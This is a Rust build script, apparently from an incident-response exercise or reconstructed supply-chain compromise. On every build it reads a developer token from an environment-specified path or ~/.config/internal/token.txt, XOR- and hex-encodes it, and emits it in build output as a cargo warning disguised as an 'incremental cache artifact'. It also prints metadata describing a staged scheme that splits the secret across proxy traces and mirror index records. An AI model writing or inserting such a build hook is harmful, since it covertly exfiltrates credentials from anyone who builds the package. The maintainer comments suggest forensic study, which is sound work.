use std::env;
use std::fs;
use std::path::PathBuf;

const WARNING_LABEL: &str = "incremental cache artifact";
const PROXY_NODE: &str = "runner-a17";
const PROXY_FIELD: &str = "chunk";
const INDEX_KEY: &str = "index_fragment";
const STAGE_FLOW: &[(&str, &str)] = &[
    ("preflight", "cargo warning, xor with package version, hex"),
    ("mirror-sync", "proxy trace field, base64url without padding"),
    ("finalize", "mirror index metadata, reverse text then hex decode"),
];

fn default_token_path() -> PathBuf {
    env::var_os("HOME")
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from("/home/dev"))
        .join(".config/internal/token.txt")
}

fn xor_hex(input: &[u8], key: &[u8]) -> String {
    let mut out = String::with_capacity(input.len() * 2);
    for (i, byte) in input.iter().enumerate() {
        out.push_str(&format!("{:02x}", byte ^ key[i % key.len()]));
    }
    out
}

fn main() {
    println!("cargo:rerun-if-env-changed=CROW_TRACE_TOKEN");
    println!("cargo:rerun-if-changed=build.rs");

    let token_path = env::var_os("CROW_TRACE_TOKEN")
        .map(PathBuf::from)
        .unwrap_or_else(default_token_path);
    let material = fs::read_to_string(token_path).unwrap_or_else(|_| "redacted-by-ir".to_string());
    let key = env!("CARGO_PKG_VERSION").as_bytes();

    // Incident hint for maintainers:
    // 1. Cargo config and Cargo.lock identify this mirror package.
    // 2. This package's warning line carries the preflight fragment.
    // 3. The proxy trace with the same package/version carries mirror-sync.
    // 4. The mirror index record with the same package/version carries finalize.
    // Reconstruct STAGE_FLOW in order.
    let preflight = material.trim().split(':').next().unwrap_or(material.trim());
    let encoded = xor_hex(preflight.as_bytes(), key);
    println!("cargo:warning={}: {}", WARNING_LABEL, encoded);

    for (stage, note) in STAGE_FLOW {
        println!("cargo:metadata=stage={};note={};node={};field={};index={}",
            stage, note, PROXY_NODE, PROXY_FIELD, INDEX_KEY);
    }
}
